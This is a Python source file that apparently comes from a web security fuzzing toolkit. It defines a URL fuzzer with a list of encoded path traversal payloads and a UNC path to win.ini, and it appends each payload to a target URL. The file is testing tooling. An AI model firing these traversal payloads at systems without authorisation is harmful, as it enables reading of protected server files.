#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer


class URL(Fuzzer):

    """URL"""

    payloads = [
        r'../',
        r'..;/',
        r'..././',
        r'...\\.\\',
        r'..\\',
        r'..\\/',
        r'%2e%2e%2f',
        r'%252e%252e%252f',
        r'%c0%ae%c0%ae%c0%af',
        r'%uff0e%uff0e%u2215',
        r'%uff0e%uff0e%u2216',
    ]

    _utf8 = {
        '.': '\u002e',
        '/': '\u2215',
        '\\': '\u2216',
    }

    unc = '\\\\localhost\\c$\\windows\\win.ini'


    def __init__(self):
        super(URL, self).__init__()

    @classmethod
    def test(cls, url):
        for p in cls.payloads:
            yield url + p
